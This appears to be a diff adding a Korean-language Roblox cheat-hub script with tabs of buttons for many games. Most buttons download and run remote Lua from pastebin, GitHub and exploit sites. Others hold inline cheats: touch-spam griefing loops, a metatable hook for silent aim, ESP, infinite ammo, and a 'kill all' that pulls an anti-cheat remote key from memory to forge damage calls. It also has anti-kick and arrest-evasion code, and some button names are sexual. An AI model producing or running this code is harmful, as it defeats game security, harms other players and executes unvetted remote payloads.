+local Button = Tab:CreateButton({
+   Name = "빡종타 2 (테러 강도 하)",
+   Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/j8WFMfYP"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "공부 타워 (테러 강도 상)",
+   Callback = function()
+   local poss = {
+    Vector3.new(-383.888214, 44.5067635, 74.1641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-392.693909, 45.5067558, 74.1641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-401.960571, 46.4828911, 74.1641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-410.766235, 47.4828835, 74.1641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-418.753021, 48.5947037, 74.1641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-428.019684, 49.5708389, 74.1641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 135.5, 19.6641541, -1.1920929e-07, 0, -1.00000012, 0, 1, 0, 1.00000012, 0, -1.1920929e-07),
+    Vector3.new(-371.761017, 136.500015, 20.6641541, -1.1920929e-07, 0, -1.00000012, 0, 1, 0, 1.00000012, 0, -1.1920929e-07),
+    Vector3.new(-371.761017, 137.5, 21.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 138.500031, 22.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 139.500015, 23.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 140.500015, 24.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 141.500015, 25.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 142.500015, 26.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 143.500031, 27.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 144.500031, 28.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-371.761017, 144.500031, 28.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 146.500031, 30.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 147.500031, 31.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 147.500031, 31.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 149.500031, 33.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 150.500031, 34.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 151.500015, 36.6641579, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 150.500015, 38.6641579, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 151.500031, 60.6641579, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 152.500031, 62.6641579, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 151.500031, 64.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-371.761017, 152.500031, 66.6641541, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+}
+
+_G.Parts = {}
+
+for _, part in ipairs(workspace:GetChildren()) do
+    if part:IsA('BasePart') and table.find(poss, part.Position) then
+        warn(part)
+        table.insert(_G.Parts, part)
+    end
+end
+table.foreach(_G.Parts, print)
+
+
+while task.wait(.1) do
+for _, part in ipairs(_G.Parts) do
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 0)
+task.wait(.1)
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 1)
+end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "트롤하는 타워 (테러 강도 상)",
+   Callback = function()
+      local poss = {
+    Vector3.new(-441.328552, -389.156494, 211.326096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-485.828552, -294.424194, 112.325119, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-472.828552, -294.424194, 112.325119, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-459.828552, -294.424194, 112.325119, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-498.828552, -231.691925, 191.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-498.828552, -231.691925, 196.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-498.828552, -231.691925, 205.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-454.828552, -203.69194, 213.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-446.828552, -203.69194, 213.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-438.828552, -203.69194, 213.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-430.828644, -203.69194, 213.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-402.479187, 485.468506, 167.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-556.828552, -72.9596252, 165.326004, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-556.828552, -72.9596252, 155.326004, -1, 0, 0, 0, 1, 0, 0, 0, -1),
+    Vector3.new(-556.828552, -73.4596252, 145.326004, -1, 0, 0, 0, 1, 0, 0, 0, -1),
+    Vector3.new(-556.828552, -73.4596252, 135.326004, -1, 0, 0, 0, 1, 0, 0, 0, -1),
+    Vector3.new(-402.479187, 485.468506, 157.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+     Vector3.new(-402.479187, 485.468506, 147.826096, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+}
+
+_G.Parts = {}
+
+for _, part in ipairs(workspace:GetChildren()) do
+    if part:IsA('BasePart') and table.find(poss, part.Position) then
+        warn(part)
+        table.insert(_G.Parts, part)
+    end
+end
+table.foreach(_G.Parts, print)
+
+
+while task.wait(.1) do
+for _, part in ipairs(_G.Parts) do
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 0)
+task.wait(.1)
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 1)
+end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "하꼬들은 못 깨는 타워 (테러 강도 하)",
+   Callback = function()
+      loadstring(game:HttpGet("https://pastebin.com/raw/Chm789wK"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "학생은 못 깨는 타워 (테러 강도 중)",
+   Callback = function()
+      local poss = {
+    Vector3.new(-156.669403, 80.5, 148.870422, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-156.669403, 80.5, 164.870483, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-156.669403, 80.5, 180.870483, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-156.669403, 80.5, 214.870483, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-156.669403, 80.5, 196.870483, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-273.169434, 242.5, 206.417633, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-273.169434, 242.5, 188.417679, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-273.169434, 242.5, 170.417664, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-273.169434, 242.5, 152.417664, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-273.169434, 242.5, 134.917664, 1, 0, 0, 0, 1, 0, 0, 0, 1),
+    Vector3.new(-273.169434, 242.5, 116.417656, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+}
+
+_G.Parts = {}
+
+for _, part in ipairs(workspace:GetChildren()) do
+    if part:IsA('BasePart') and table.find(poss, part.Position) then
+        warn(part)
+        table.insert(_G.Parts, part)
+    end
+end
+print('done!!')
+table.foreach(_G.Parts, print)
+
+
+while task.wait(.1) do
+for _, part in ipairs(_G.Parts) do
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 0)
+task.wait(.1)
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 1)
+end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "트롤들은 못 깨는 타워 (테러 강도 상)",
+   Callback = function()
+      local poss = {
+    Vector3.new(-34.8450928, 99.5898972, 38.1106415, 0, 0, -1, 0, 1, 0, 1, 0, 05),
+    Vector3.new(-34.8450928, 99.5899734, 24.9667969, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-34.8450928, 99.5898972, 10.8118877, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-19.1735916, 278.548401, 15.8672085, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-19.1735916, 278.548401, 27.9999886, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(-19.1735916, 278.548401, 39.1217041, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(83.4494934, 342.245514, 30.1392689, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(96.5933456, 341.234467, 30.1392689, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(70.3056488, 341.234467, 30.1392689, 0, 0, -1, 0, 1, 0, 1, 0, 0),
+    Vector3.new(61.2060699, 340.223358, 30.1392689, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+}
+
+_G.Parts = {}
+
+for _, part in ipairs(workspace:GetChildren()) do
+    if part:IsA('BasePart') and table.find(poss, part.Position) then
+        warn(part)
+        table.insert(_G.Parts, part)
+    end
+end
+print('done!!')
+table.foreach(_G.Parts, print)
+
+
+while task.wait(.1) do
+for _, part in ipairs(_G.Parts) do
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 0)
+task.wait(.1)
+firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 1)
+end
+end
+   end,
+})
+
+
+local Tab = Window:CreateTab("가강전✊", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "무적(E홀드)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/mujck/refs/heads/main/da"))()
+
+end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "올 폴링",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/allfling/refs/heads/main/allfling"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "원하는 사람 폴링",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/fling/refs/heads/main/fling"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "가로우 전용 1번 즉사",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/firstkill/refs/heads/main/firstkill"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "진격의거인",
+   Callback = function()
+   loadstring(game:HttpGet("https://paste.ee/r/fxY03"))()
+   end, 
+})
+
+local Button = Tab:CreateButton({
+   Name = "블랙피규어(KJ)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fartmaggot445/KYR/refs/heads/main/kj"))()
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "무한 쓰레기통",
+   Callback = function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Trashcan%20Man", true))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "VexonHub",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/VexonHub"))()   end,
+})
+
+local Tab = Window:CreateTab("라이벌🔫", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+
+local Button = Tab:CreateButton({
+   Name = "모던",
+   Callback = function()
+loadstring(game:HttpGet'https://exploit.plus/Loader')()
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "키시아 훅 v2",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.luau"))()
+   end,
+})    
+local Tab = Window:CreateTab("FE🎸", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "FE자위",
+   Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
+   end,
+})
+
+   local Button = Tab:CreateButton({
+   Name = "FE에니메이션",
+   Callback = function()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/f018928d2f010789a150b4924e279b16/raw/8de399eb9cbccbde430fcd37270cd4ff171f8b8e/AnimationGUI.txt"))()
+   end,
+}) 
+    local Button = Tab:CreateButton({
+   Name = "FE Scp 096",
+   Callback = function()
+loadstring(game:HttpGet("https://pastefy.app/M25RnnGm/raw"))()
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "FE커스텀 툴",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/customtools.lua"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "FE가짜 vr(모자있어야됨)",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "FE자지(모자있어야 작동)",
+   Callback = function()
+loadstring(game:HttpGet("https://paste.ee/r/ZYsvl5qS/0", true))()
+   end,
+})
+
+local Tab = Window:CreateTab("한머🤣", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "koreamadher",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/madmad7070/koreamadher/refs/heads/main/gksrnrajej"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "esp",
+   Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/minute124/RH-666-/refs/heads/main/ee454504248d2435.lua'))()
+   end, 
+})
+
+local Tab = Window:CreateTab("복싱베타🥊", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "데미지 딜레이 없애기",
+   Callback = function()
+game:GetService("RunService").Heartbeat:Connect(function()
+game.Players.LocalPlayer.Character.PunchMeter.Value = 1
+end)
+end,
+})
+
+
+local Tab = Window:CreateTab("암보결🖤", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "힛박 키우기",
+   Callback = function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Update-script-hitbox-9326"))()
+   end,
+})
+
+local Tab = Window:CreateTab("베드워즈🍕", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+ local Button = Tab:CreateButton({
+   Name = "배드워즈 vape",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
+   end,
+})
+ local Button = Tab:CreateButton({
+   Name = "cat vape",
+   Callback = function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/new-qwertyui/CatV5/main/init.lua'), 'init.lua')()
+   end,
+})
+
+ local Button = Tab:CreateButton({
+   Name = "Voidware",
+   Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWRewrite/main/NewMainScript.lua", true))()
+   end,
+})
+    
+local Tab = Window:CreateTab("프리즌라이프🤩", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "프리즌 라이프 어드민",
+   Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/BBmCUwQg"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "낫베드",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
+   end,
+})
+
+local Tab = Window:CreateTab("아스널🧤", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "킬올 있음",
+   Callback = function()
+   loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/b95e8fecdf824e41f4a030044b055add.lua'))()
+   end, 
+})
+
+local Tab = Window:CreateTab("부대테러😶‍🌫️", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "키 FLY",
+   Callback = function()
+   loadstring(game:HttpGet(('https://raw.githubusercontent.com/SinEunByeol/DGHub/refs/heads/main/NoObfuscator')))()
+   end, 
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "동굴부대 사일런스",
+   Callback = function()
+   for k, v in pairs(getgc(true)) do
+	if pcall(function()
+			return rawget(v, "indexInstance")
+		end) and type(rawget(v, "indexInstance")) == "table" and (rawget(v, "indexInstance"))[1] == "kick" then
+		setreadonly(v, false)
+		v.tvk = {
+			"kick",
+			function()
+				return game.Workspace:WaitForChild("")
+			end
+		}
+	end
+end
+
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+local fovRadius = 100
+local fovCircle = nil
+local SilentAimRS = nil
+local remote_key = {}
+local CurrentTarget = nil
+local processing = false
+
+local function getSafeGuiParent()
+	return CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
+end
+
+local function removeExistingAimbotGuis()
+	local parent = getSafeGuiParent()
+	if parent then
+		local oldGui = parent:FindFirstChild("MobileAimbotUI")
+		if oldGui then oldGui:Destroy() end
+	end
+	if fovCircle then fovCircle:Destroy() fovCircle = nil end
+end
+
+
+local function applyESP(char)
+	if not char then return end
+	local h = char:FindFirstChild("TargetHighlight")
+	if not h then
+		h = Instance.new("Highlight")
+		h.Name = "TargetHighlight"
+		h.FillColor = Color3.fromRGB(255, 0, 0)
+		h.OutlineColor = Color3.fromRGB(255, 255, 255)
+		h.FillTransparency = 0.5
+		h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+		h.Parent = char
+	end
+end
+
+local function removeESP(char)
+	if char and char:FindFirstChild("TargetHighlight") then
+		char.TargetHighlight:Destroy()
+	end
+end
+
+local function removeAllESP()
+	for _, p in pairs(Players:GetPlayers()) do
+		if p.Character then removeESP(p.Character) end
+	end
+end
+
+local function isVisible(targetPart)
+	local origin = Camera.CFrame.Position
+	local destination = targetPart.Position
+	local direction = destination - origin
+	local raycastParams = RaycastParams.new()
+	raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, Camera}
+	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+	local result = workspace:Raycast(origin, direction, raycastParams)
+	if result then
+		return result.Instance:IsDescendantOf(targetPart.Parent)
+	end
+	return true
+end
+
+local function ReplaceChar(pos, str, r)
+	return str:sub(1, pos-1) .. r .. str:sub(pos+1)
+end
+
+local function GetPlayerUserId(Player)
+	local user_id = Player.UserId
+	if #tostring(user_id) ~= 9 then
+		user_id = math.abs(user_id * 100000000)
+	end
+	return user_id
+end
+
+local function NextRemoteKey(Player)
+	local user_id = GetPlayerUserId(Player)
+	local key = remote_key[user_id]
+	if not key then return nil end
+
+	local a = key:sub(4,4)
+	local p = string.byte(key:sub(1,1))
+	local s = (tonumber(a) or 0) * 2
+	if s > 9 then s = 1 end
+	local n = key:gsub(a, tostring(s))
+	local h = p + 4 - s
+	if h > 90 then h = 65 end
+	local n1 = ReplaceChar(1, n, string.char(h))
+	remote_key[user_id] = n1
+	return n1
+end
+
+local function isTargetValid(targetPlayer)
+	if not targetPlayer or targetPlayer == LocalPlayer then return false end
+	local char = targetPlayer.Character
+	if not char or not char.Parent then return false end
+	local humanoid = char:FindFirstChildOfClass("Humanoid")
+	if not humanoid or humanoid.Health <= 0 then return false end
+	return true
+end
+
+local function getTool()
+	local tool = LocalPlayer.Character:FindFirstChild("Info", true) or LocalPlayer.Backpack:FindFirstChild("Info", true)
+	return tool and tool.Parent or nil
+end
+
+local function ByPassKey(k, targetPlayer)
+	if not k or not isTargetValid(targetPlayer) then return end
+	local tool = getTool()
+	if not tool then return end
+	local ok, Info = pcall(require, tool.Info)
+	if not ok then return end
+
+	local damageRemote = ReplicatedStorage:FindFirstChild("Assets"):FindFirstChild("Misc"):FindFirstChild("CWS_Directory"):FindFirstChild("remotes"):FindFirstChild("Damage")
+	if damageRemote then
+		damageRemote:FireServer({
+			["damage"] = Info.damage.headshot,
+			["k"] = k,
+			["hit_name"] = "Head",
+			["target"] = targetPlayer.Character.Humanoid,
+			["velocity"] = Vector3.new(0, 0, 0),
+			["tool"] = tool,
+			["auth"] = false
+		})
+	end
+end
+
+local Window = Fluent:CreateWindow({
+	Title = "Cave Army",
+	SubTitle = "By JHK",
+	TabWidth = 160,
+	Size = UDim2.fromOffset(500, 420),
+})
+
+local Tab = Window:AddTab({ Title = "Main", Icon = "user" })
+local Misc = Window:AddTab({ Title = "Misc", Icon = "plus-circle" })
+local Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+
+local Section = Tab:AddSection("Silent Aim")
+local KillAllSection = Tab:AddSection("Kill All")
+
+local Slider = Section:AddSlider("Fov", {
+	Title = "Fov", Default = 100, Min = 50, Max = 200, Rounding = 1,
+	Callback = function(Value) fovRadius = Value end
+})
+
+local SilentAim = Section:AddToggle("SilentAim", { Title = "SilentAim", Default = false })
+local ShowTargetPlayer = Section:AddToggle("ShowTargetPlayer", { Title = "ShowTargetPlayer", Default = false })
+
+Section:AddButton({
+	Title = "무한총알",
+	Description = "총 들지말고 사용하세요",
+	Callback = function()
+		task.spawn(function()
+			while wait() do
+				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
+					if v:IsA("Tool") and v:FindFirstChild("Info") then
+						v:SetAttribute("ammo", math.huge)
+					end
+				end
+			end
+		end)
+	end
+	})
+
+	SilentAim:OnChanged(function()
+	if SilentAim.Value then
+		removeExistingAimbotGuis()
+		local screenGui = Instance.new("ScreenGui", getSafeGuiParent())
+		screenGui.Name = "MobileAimbotUI"
+
+		fovCircle = Instance.new("Frame", screenGui)
+		fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+		fovCircle.BackgroundTransparency = 1
+		local stroke = Instance.new("UIStroke", fovCircle)
+		stroke.Color = Color3.new(0.33, 0.33, 1)
+		stroke.Thickness = 2
+		Instance.new("UICorner", fovCircle).CornerRadius = UDim.new(1, 0)
+
+		SilentAimRS = RunService.RenderStepped:Connect(function()
+			local mousePos = UserInputService:GetMouseLocation()
+			if fovCircle then
+				local currentRadius = tonumber(fovRadius) or 100
+				fovCircle.Position = UDim2.new(0, mousePos.X, 0, mousePos.Y)
+				fovCircle.Size = UDim2.new(0, currentRadius * 2, 0, currentRadius * 2)
+			end
+
+			local closestTarget = nil
+			local lowestScore = math.huge 
+			local radiusLimit = tonumber(fovRadius) or 100
+
+			removeAllESP()
+
+			local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+			if not myRoot then return end
+
+			for _, p in pairs(Players:GetPlayers()) do
+				if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") and not p.Character:FindFirstChild("Tag") and p.Character:FindFirstChild("Humanoid").Health > 0 then
+					local char = p.Character
+					local head = char.Head
+
+					local screenPoint, onScreen = Camera:WorldToViewportPoint(head.Position)
+
+					if onScreen then
+						local mouseDistance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePos).Magnitude
+
+						if mouseDistance <= radiusLimit then
+							if isVisible(head) then
+								local worldDistance = (head.Position - myRoot.Position).Magnitude
+								local score = mouseDistance + (worldDistance * 0.8)
+
+								if score < lowestScore then
+									lowestScore = score
+									closestTarget = head
+								end
+							end
+						end
+					end
+				end
+			end
+			CurrentTarget = closestTarget
+			if ShowTargetPlayer.Value and CurrentTarget and CurrentTarget.Parent then
+				applyESP(CurrentTarget.Parent)
+			end
+		end)
+	else
+		if SilentAimRS then SilentAimRS:Disconnect() end
+		removeExistingAimbotGuis()
+		removeAllESP()
+	end
+end)
+
+KillAllSection:AddButton({
+	Title = "Kill All (총들고 실행하세요)",
+	Callback = function()
+		if processing then return end
+		local tool = getTool()
+		if not tool then Fluent:Notify({Title="오류", Content="총을 드세요"}) return end
+
+		local userid = GetPlayerUserId(LocalPlayer)
+		local retrieved = filtergc("table", { Keys = { "remote_key" } }, true)
+		if retrieved and retrieved.remote_key then
+			for _, v in pairs(retrieved.remote_key) do remote_key[userid] = v break end
+		end
+
+		if not remote_key[userid] then Fluent:Notify({Title="오류", Content="키를 찾지 못함."}) return end
+
+		task.spawn(function()
+			processing = true
+			for i = 1, 60 do
+				local targets = {}
+				for _, p in pairs(Players:GetPlayers()) do if isTargetValid(p) then table.insert(targets, p) end end
+				if #targets == 0 then break end
+				for _, target in pairs(targets) do
+					local k = NextRemoteKey(LocalPlayer)
+					if k then ByPassKey(k, target) end
+					task.wait(0.05)
+				end
+				task.wait(0.1)
+			end
+			processing = false
+		end)
+	end
+})
+
+Misc:AddButton({ Title = "Infinite Yield", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end })
+local BypassArrest = Misc:AddToggle("영창우회", { Title = "영창우회", Default = false })
+local IsBypassArrest = false
+local BypassConn
+
+BypassArrest:OnChanged(function()
+	task.spawn(function()
+		IsBypassArrest = BypassArrest.Value
+		if IsBypassArrest then
+			local PlaceId, JobId = game.PlaceId, game.JobId
+			local TeleportService = game:GetService("TeleportService")
+
+			local function Rejoin()
+				LocalPlayer:Kick("영창우회 작동")
+			end
+
+			local function OnChat(plr)
+				plr.Chatted:Connect(function(msg)
+					if not IsBypassArrest then return end
+					local command, targetName = msg:match("^[:;]([^%s]+)%s+([^%s]+)")
+					if command and targetName and (command == "영창" or command == "arrest" or command == "체포") then
+						local myName = LocalPlayer.Name:lower()
+						local tn = targetName:lower()
+						if tn == myName or tn == myName:sub(1, #tn) then
+							Rejoin()
+						end
+					end
+				end)
+			end
+
+			for _, plr in pairs(Players:GetPlayers()) do
+				OnChat(plr)
+			end
+			BypassConn = Players.PlayerAdded:Connect(OnChat)
+		else
+			if BypassConn then
+				BypassConn:Disconnect()
+				BypassConn = nil
+			end
+		end
+	end)
+end)
+
+
+local mt = getrawmetatable(game)
+local old = mt.__index
+setreadonly(mt, false)
+
+mt.__index = newcclosure(function(self, key)
+	if not checkcaller() and self:IsA("Mouse") and key == "Hit" then
+		if SilentAim.Value and CurrentTarget then
+			local char = LocalPlayer.Character
+			local humanoid = char and char:FindFirstChild("Humanoid")
+
+			if humanoid then
+				if humanoid.WalkSpeed > 16 then
+					local prediction = CurrentTarget.Velocity * 0.0625
+					return CFrame.new(CurrentTarget.Position - prediction)
+				else
+					return CFrame.new(CurrentTarget.Position)
+				end
+			end
+		end
+	end
+	return old(self, key)
+end)
+
+setreadonly(mt, true)
+
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+InterfaceManager:BuildInterfaceSection(Settings)
+SaveManager:BuildConfigSection(Settings)
+Window:SelectTab(1)
+Fluent:Notify({Title="Cave Army", Content="로딩 완료", Duration=5})
+   end, 
+})
+
+local Button = Tab:CreateButton({
+   Name = "동굴부대 올킬",
+   Callback = function()
+   if game.ReplicatedStorage:FindFirstChild("Assets"):FindFirstChild("Misc"):FindFirstChild("CWS_Directory"):FindFirstChild("remotes"):FindFirstChild("SetHandleEffects") then
+	game.ReplicatedStorage:FindFirstChild("Assets"):FindFirstChild("Misc"):FindFirstChild("CWS_Directory"):FindFirstChild("remotes"):FindFirstChild("SetHandleEffects"):Destroy()
+	print("리모트 제거 성공")
+else
+	print("리모트 제거 성공")
+end
+
+local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local RunService = game:GetService("RunService")
+
+local Wavehub = Instance.new("ScreenGui")
+local ImageLabel = Instance.new("ImageLabel")
+local TextButton = Instance.new("TextButton")
+local CaveArmy = Instance.new("TextLabel")
+
+Wavehub.Name = "Wavehub"
+Wavehub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Wavehub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Wavehub.ResetOnSpawn = false
+
+ImageLabel.Parent = Wavehub
+ImageLabel.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+ImageLabel.BorderColor3 = Color3.fromRGB(40, 40, 40)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.421536922, 0, 0.304595262, 0)
+ImageLabel.Size = UDim2.new(0, 300, 0, 317)
+ImageLabel.Image = "rbxassetid://3680187549"
+ImageLabel.Active = true -- **드래그를 위한 필수 설정**
